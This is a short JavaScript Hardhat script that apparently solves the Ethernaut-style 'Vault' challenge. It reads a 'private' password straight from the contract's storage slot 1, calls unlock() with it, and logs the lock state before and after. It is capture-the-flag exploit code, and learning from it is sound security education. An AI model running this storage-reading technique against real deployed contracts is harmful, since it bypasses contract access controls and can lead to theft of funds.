
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0xe082b26cEf079a095147F35c9647eC97c2401B83"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const provider = waffle.provider

    // get password from storage
    const password = await provider.getStorageAt(CONTRACT_ADDRESS, 1)
    console.log(password)

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Vault", CONTRACT_ADDRESS, signer)

    // check lock status before unlock
    const locked = await contract.locked()
    console.log(locked)

    // unlock with password
    await contract.unlock(password)

    // check lock status before unlock
    const locked1 = await contract.locked()
    console.log(locked1)
}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});